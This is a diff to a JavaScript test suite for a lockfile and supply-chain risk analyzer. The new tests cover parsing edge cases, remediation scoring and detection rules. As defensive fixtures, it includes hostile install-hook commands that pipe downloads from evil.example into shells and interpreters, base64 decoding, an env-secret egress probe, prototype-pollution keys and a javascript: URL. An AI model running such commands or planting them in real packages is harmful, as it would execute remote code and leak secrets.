@@ -21,8 +21,7 @@ const scores = { lifecycle: 72, lookalikes: 59, scope: 89, baseline: 0 };
 
 for (const [label, text] of [
   ['duplicate', '{"a":1,"a":2}'], ['escaped duplicate', '{"a":1,"\\u0061":2}'],
-  ['prototype', '{"__proto__":{}}'], ['nested constructor', '{"list":[{"constructor":1}]}'],
-  ['escaped prototype', '{"\\u005f_proto__":0}'], ['prototype member', '{"prototype":{}}'],
+  ['prototype', '{"__proto__":{}}'], ['escaped prototype', '{"\\u005f_proto__":0}'],
   ['trailing object comma', '{"a":1,}'], ['trailing array comma', '[true,]'], ['double comma', '[1,,2]'],
   ['unquoted key', '{x:1}'], ['missing colon', '{"x" 1}'], ['missing comma', '{"a":1 "b":2}'],
   ['trailing data', '{}true'], ['octal number', '012'], ['overflow', '1e400'], ['floating dot', '1.'],
@@ -35,6 +34,7 @@ for (const [label, text, expected] of [
   ['mixed array', '[null,false,-1.25e+2,"a b",{}]', '[null,false,-125,"a b",{}]'],
   ['escaped keys and quotes', '{"foo\\"bar":"\\u0061"}', '{"foo\\"bar":"a"}'],
   ['prototype-like name as a value', '{"field":"__proto__"}', '{"field":"__proto__"}'],
+  ['constructor and prototype as ordinary keys', '{"list":[{"constructor":1}],"prototype":{}}', '{"list":[{"constructor":1}],"prototype":{}}'],
   ['scalar with JSON whitespace', '\r\n\t -1.25 \t', '-1.25'],
 ]) test(`strict JSON accepts ${label}`, () => assert.equal(JSON.stringify(strictJson(text)), expected));
 
@@ -107,8 +107,40 @@ test('input rejects a boundary breach in UTF-8 bytes, not just UTF-16 units', ()
 });
 test('mislabeled and unknown documents are not treated as clean inputs', () => {
   assert.throws(() => lock('{}'), /Unrecognized/);
-  assert.throws(() => parseInput('not a lockfile', 'x.lock'), /Unrecognized/);
+  assert.throws(() => parseInput('not a lockfile', 'x.lock'), /Cargo TOML/);
   assert.throws(() => lock('null'), /object/);
+});
+test('input dispatch sniffs JSON content, Cargo .lock files, and extensionless requirements', () => {
+  const reqs = parseInput('numpy==2.1.0\n', 'requirements');
+  assert.equal(reqs.format, 'pypi');
+  const jsonInTxt = parseInput(npm({}), 'data.txt');
+  assert.equal(jsonInTxt.format, 'npm');
+  const toml = '[[package]]\nname = "a"\nversion = "1.0.0"\n';
+  assert.equal(parseInput(toml, 'vendor.lock').format, 'cargo');
+  assert.throws(() => parseInput('# yarn lockfile v1\n"dep@1":\n  version "1"\n', 'yarn.lock'), /Cargo TOML/);
+});
+test('npm parses real package names that resemble prototype members and keeps proto blocked', () => {
+  const parsed = lock(npm({ '': { dependencies: { constructor: '1.0.0', prototype: '2.0.0', toString: '3.0.0' } },
+    'node_modules/constructor': { version: '1.0.0' }, 'node_modules/prototype': { version: '2.0.0' },
+    'node_modules/toString': { version: '3.0.0' } }));
+  const result = analyze(parsed);
+  assert.equal(parsed.nodes.length, 4);
+  assert.equal(result.depths.get('npm:node_modules/constructor'), 1);
+  assert.equal(result.depths.get('npm:node_modules/toString'), 1);
+  assert.equal(result.metrics.reachable, 3);
+  assert.throws(() => lock('{"lockfileVersion":3,"packages":{"":{"dependencies":{"__proto__":"1.0.0"}}}}'), /Reserved key/);
+  assert.throws(() => lock(npm({ 'node_modules/__proto__': { version: '1.0.0' } })));
+});
+test('npm rejects a malformed Unicode installation path', () => {
+  assert.throws(() => lock(npm({ 'a\uD800b/node_modules/x': { version: '1.0.0' } })), /installation path/);
+});
+test('npm optional declarations take precedence over dev and peer declarations', () => {
+  const parsed = lock(npm({ '': {
+    devDependencies: { opt: '1.0.0' }, optionalDependencies: { opt: '1.0.0', peerish: '1.0.0' },
+    peerDependencies: { peerish: '*' }, peerDependenciesMeta: { peerish: { optional: false } },
+  }, 'node_modules/opt': { version: '1.0.0' }, 'node_modules/peerish': { version: '1.0.0' } }));
+  assert.equal(parsed.edges.length, 2);
+  assert.deepEqual(parsed.edges.map(item => item.kind), ['optionalDependencies', 'optionalDependencies']);
 });
 
 for (const [label, text, version] of [
@@ -121,6 +153,12 @@ for (const [label, text, version] of [
   ['quoted markers', "scipy==1.2 ; extra not in 'work'", '1.2'],
   ['bare declaration', 'urllib3', ''], ['boundary comment', 'urllib3==1.2 # test', '1.2'],
   ['direct URL', 'pandas @ https://artifact.example.invalid/wheel#fragment', ''],
+  ['spaced extras', 'x[ a , b ]==1.0', '1.0'],
+  ['git ssh direct reference', 'pkg @ git+ssh://git@vcs.example.invalid/o/r.git', ''],
+  ['ssh direct reference', 'pkg @ ssh://git@vcs.example.invalid/o/r.git', ''],
+  ['hg direct reference', 'pkg @ hg+https://vcs.example.invalid/r', ''],
+  ['svn direct reference', 'pkg @ svn+svn://vcs.example.invalid/r', ''],
+  ['ftp direct reference', 'pkg @ ftp://mirror.example.invalid/pkg-1.tgz', ''],
   ['continued digest', `urllib3==1.2 \\\n  --hash=sha256:${'af'.repeat(32)}`, '1.2'],
 ]) test(`requirements accepts ${label}`, () => {
   const parsed = py(text);
@@ -134,8 +172,8 @@ for (const [label, text] of [
   ['invalid version operator', 'x=>2.0'], ['invalid trailing comma', 'x>=2,'], ['invalid wildcard', 'x>=2.*'],
   ['invalid extra list', 'x[,fast]==1'], ['unknown marker variable', 'x==2; release == "new"'],
   ['incomplete marker', 'x==2; (python_version >= "3.11"'], ['missing marker expression', 'x==2;'],
-  ['unsupported bare URL', 'https://example.invalid/wheel.whl'], ['unsupported URL protocol', 'x @ ftp://example.invalid/'],
-  ['unterminated continuation', 'x==1 \\'], ['reserved name', 'constructor==1'],
+  ['unsupported bare URL', 'https://example.invalid/wheel.whl'], ['unsupported URL protocol', 'x @ javascript:alert(1)'],
+  ['unterminated continuation', 'x==1 \\'], ['reserved name', '__proto__==1'],
 ]) test(`requirements rejects ${label}`, () => assert.throws(() => py(text)));
 
 const crate = (name, value = '1.0.0', tail = '') => `[[package]]\nname = "${name}"\nversion = "${value}"${tail ? `\n${tail}` : ''}\n`;
@@ -145,7 +183,7 @@ for (const [label, text] of [
   ['duplicate field', `${crate('a')}name = "b"`], ['duplicate table declaration', crate('a') + crate('a')],
   ['duplicate metadata', `${crate('a')}[metadata]\n[metadata]\n`],
   ['reserved key', `${crate('a')}[metadata]\n"__proto__" = "x"\n`],
-  ['escaped reserved key', `${crate('a')}[metadata]\n"\\u0063onstructor" = "x"\n`],
+  ['escaped reserved key', `${crate('a')}[metadata]\n"\\u005f_proto__" = "x"\n`],
   ['missing name', '[[package]]\nversion="1.0.0"'], ['invalid checksum', crate('a', '1.0.0', 'checksum = "ab"')],
   ['invalid Unicode codepoint', '[[package]]\nname = "\\uD800"\nversion="1.0.0"'],
   ['broken table delimiters', '[ [ package ] ]\nname="a"\nversion="1.0.0"'],
@@ -233,6 +271,11 @@ for (let mask = 0; mask < 2 ** choices.length; mask++) test(`three-vertex reacha
     walk(start, target, id => outgoing.get(id)) && !walk(target, start, id => outgoing.get(id))));
   assert.deepEqual(inferredEntries(vertices.map(id => ({ id })), edges), expectedEntries);
 });
+test('trace terminates on a cyclic predecessor map instead of looping forever', () => {
+  const cyclic = new Map([['b', 'a'], ['a', 'b'], ['c', null]]);
+  assert.deepEqual(trace('b', cyclic), ['a', 'b']);
+  assert.equal(trace('c', cyclic).length, 1);
+});
 
 for (const [a, b, distance] of [
   ['', '', 0], ['', 'tool', 4], ['abc', '', 3], ['read', 'read', 0], ['react', 'recat', 1], ['abc', 'adc', 1],
@@ -300,10 +343,11 @@ test('upgrade requires a real candidate, never invents new hashes and labels unk
   const simulated = simulate(model, change);
   assert.equal(simulated.nodes.find(item => item.id === id).integrity, '');
   assert.equal(simulated.edges.filter(edge => edge.to === id)[0].spec, '1.7.0');
-  assert.equal(analyze(simulated).score, 12);
+  assert.equal(analyze(simulated).score, 0);
   assert.match(simulated.notes.at(-1), /missing evidence, not safety/);
   assert.throws(() => simulate(model, new Map([[id, { action: 'upgrade', version: 'next' }]])), /concrete/);
   assert.throws(() => simulate(model, new Map([[id, { action: 'upgrade', version: '1.6.0' }]])), /different/);
+  assert.throws(() => simulate(model, new Map([[id, { action: 'upgrade', version: '1.5.9' }]])), /newer/);
   assert.throws(() => simulate(model, new Map([[id, { action: 'upgrade', version: '1.7.0', integrity: 'bad' }]])), /valid SHA/);
 });
 test('simulation does not accept remediation of the graph root or an unknown node', () => {
@@ -369,6 +413,131 @@ test('CycloneDX references a unique root and excludes quarantined packages from 
     assert.ok(refs.has(dependency.ref));
     assert.ok(dependency.dependsOn.every(ref => refs.has(ref)));
   }
+});
+const npmHook = (text, name = 'snared') => {
+  const model = lock(npm({
+    '': { dependencies: { [name]: '1.0.0' } },
+    [`node_modules/${name}`]: { version: '1.0.0', hasInstallScript: true },
+  }));
+  model.nodes.find(node => !node.root).hooks = [{ name: 'postinstall', text }];
+  return model;
+};
+
+for (const [label, hook] of [
+  ['sudo shell', 'curl https://evil.example/x | sudo sh'],
+  ['env bash', 'curl https://evil.example/x | env bash'],
+  ['tee then shell', 'curl https://evil.example/x | tee /tmp/x | sh'],
+  ['double pipe', 'curl https://evil.example/x||sh'],
+  ['perl', 'curl https://evil.example/x | perl'],
+  ['ruby', 'wget -q https://evil.example/x | ruby'],
+  ['php', 'curl https://evil.example/x | php'],
+  ['pwsh', 'curl https://evil.example/x | pwsh -c x'],
+  ['docker shell', 'curl https://evil.example/x | docker run -i img sh'],
+  ['long prefix', `curl https://evil.example/x ${'a'.repeat(400)} | sh`],
+]) test(`SG004 detects downloader pipe variant: ${label}`, () => {
+  assert.ok(analyze(npmHook(hook)).findings.some(f => f.ruleId === 'SG004'), hook);
+});
+test('SG004 leaves a non-interpreter pipe alone', () => {
+  assert.ok(!analyze(npmHook('curl https://evil.example/x | tar -xz')).findings.some(f => f.ruleId === 'SG004'));
+  assert.ok(!analyze(npmHook('curl https://evil.example/x | grep -c version')).findings.some(f => f.ruleId === 'SG004'));
+});
+for (const [label, hook] of [
+  ['certutil', 'certutil -decode f.b64 f.exe'],
+  ['openssl', 'openssl enc -d -base64 -in f'],
+  ['buffer', 'Buffer.from(x,"base64")'],
+  ['b64decode', 'base64.b64decode(payload)'],
+]) test(`SG005 detects decoding variant: ${label}`, () => {
+  assert.ok(analyze(npmHook(hook)).findings.some(f => f.ruleId === 'SG005'));
+});
+test('SG006 recognizes spaced member access in an egress probe', () => {
+  assert.ok(analyze(npmHook('https . request(process.env.SECRET)')).findings.some(f => f.ruleId === 'SG006'));
+});
+test('SG001 catches one-edit squats of short popular names without flagging noise', () => {
+  const model = lock(npm({
+    '': { dependencies: { vuw: '3.0.0', zoq: '3.0.0', god: '3.0.0', zzx: '3.0.0' } },
+    'node_modules/vuw': { version: '3.0.0' }, 'node_modules/zoq': { version: '3.0.0' },
+    'node_modules/god': { version: '3.0.0' }, 'node_modules/zzx': { version: '3.0.0' },
+  }));
+  const squats = analyze(model).findings.filter(f => f.ruleId === 'SG001').map(f => f.nodeId);
+  assert.equal(squats.length, 3);
+  assert.ok(!squats.some(id => id.includes('zzx')));
+});
+test('SG010 treats PEP 440 zero padding as one version but still flags real conflicts', () => {
+  assert.equal(analyze(py('foo==1.0\nfoo==1.0.0\n')).findings.filter(f => f.ruleId === 'SG010').length, 0);
+  assert.equal(analyze(py('Foo==1.0\nfoo==1.0.0\n')).findings.filter(f => f.ruleId === 'SG010').length, 0);
+  assert.equal(analyze(py('foo==1.0\nfoo==1.2.0\n')).findings.filter(f => f.ruleId === 'SG010').length, 2);
+});
+test('exports carry no credential material from SBOM free-text fields', async () => {
+  const doc = cdx([
+    { name: 'https://user:SECRET3:pw3@evil.example/x', type: 'library', 'bom-ref': 'https://user:SECRET1:pw@r.invalid/a', purl: 'pkg:npm/x@1.0.0' },
+    { name: 'https://user:SECRET3:pw3@evil.example/x', type: 'library', 'bom-ref': 'ref-b', purl: 'pkg:npm/x@2.0.0' },
+  ], [{ ref: 'ref-b', dependsOn: ['https://user:SECRET4:pw@q.invalid/z'] }]);
+  const analysis = analyze(sbom(doc));
+  for (const kind of ['sarif', 'cyclonedx', 'csv', 'audit']) {
+    const { text } = await makeExport(kind, analysis);
+    assert.ok(!/SECRET\d|pw3?@/.test(text), `${kind} leaks credential material`);
+  }
+});
+test('remediation never raises the risk score across every preset and target', () => {
+  for (const preset of ['lifecycle', 'lookalikes', 'scope', 'baseline']) {
+    const base = loadPreset(preset);
+    const baseScore = analyze(base).score;
+    const counts = new Map();
+    for (const node of base.nodes) {
+      if (!node.root && !node.unresolved && node.version && !node.marker && node.ecosystem && typeof node.name === 'string') {
+        const key = `${node.ecosystem}:${node.name.toLowerCase()}`;
+        counts.set(key, (counts.get(key) ?? 0) + 1);
+      }
+    }
+    for (const node of base.nodes) {
+      for (const action of ['pin', 'quarantine']) {
+        let result;
+        try { result = analyze(simulate(base, new Map([[node.id, { action }]]))); }
+        catch { continue; }
+        assert.ok(result.score <= baseScore, `${preset} ${node.id} ${action}: ${baseScore} -> ${result.score}`);
+      }
+      const key = `${node.ecosystem}:${String(node.name).toLowerCase()}`;
+      if (node.ecosystem === 'npm' && !node.local && !node.root && !node.unresolved && counts.get(key) === 1) {
+        const upgraded = analyze(simulate(base, new Map([[node.id, { action: 'upgrade', version: '99.0.0', integrity: sri(7) }]])));
+        assert.ok(upgraded.score <= baseScore, `${preset} ${node.id} upgrade: ${baseScore} -> ${upgraded.score}`);
+      }
+    }
+  }
+});
+test('simulated upgrade does not inflate risk through missing candidate metadata', () => {
+  const model = loadPreset('baseline');
+  const target = model.nodes.find(node => !node.root && node.ecosystem === 'npm' && !node.local);
+  const upgraded = analyze(simulate(model, new Map([[target.id, { action: 'upgrade', version: '9.9.9' }]])));
+  assert.equal(upgraded.score, 0);
+  assert.equal(upgraded.findings.filter(f => f.nodeId === target.id).length, 0);
+});
+test('simulate rejects non-iterable change sets', () => {
+  const model = loadPreset('scope');
+  for (const input of [null, {}, 5]) assert.throws(() => simulate(model, input), /iterable/);
+});
+test('analyze degrades gracefully on malformed hand-built models', () => {
+  assert.equal(analyze({}).score, 0);
+  assert.equal(analyze({ nodes: 'x', edges: null, notes: 9 }).score, 0);
+  assert.equal(analyze({ nodes: [{ id: 'n', name: null, hooks: 4, integrity: 42 }], edges: {}, rootId: 'r' }).score, 0);
+});
+test('sriHashes tolerates non-string input', () => {
+  for (const input of [42, null, undefined, {}]) assert.deepEqual(sriHashes(input), []);
+});
+test('CSV neutralizes a formula hidden behind a zero-width space', () => {
+  assert.equal(csvCell('​=1'), '"\'​=1"');
+});
+test('audit export skips malformed changes and records the effective pin version', async () => {
+  const model = loadPreset('scope');
+  const id = 'npm:node_modules/@signaldesk/render';
+  const version = model.nodes.find(node => node.id === id).version;
+  const simulated = simulate(model, new Map([[id, { action: 'pin' }]]));
+  const { text } = await makeExport('audit', analyze(simulated), {
+    changes: new Map([[id, { action: 'pin' }], ['bogus', { bogus: 1 }], ['x', null]]),
+  });
+  assert.deepEqual(JSON.parse(text).evidence.changes, [{ nodeId: id, action: 'pin', version }]);
+});
+test('makeExport rejects an unknown export kind', async () => {
+  await assert.rejects(() => makeExport('pdf', analyze(loadPreset('baseline'))));
 });
 test('SVG and markup are not accepted as input file types or executable expressions', () => {
   assert.throws(() => parseInput('<svg><script>throw 0</script></svg>', 'proof.svg'));
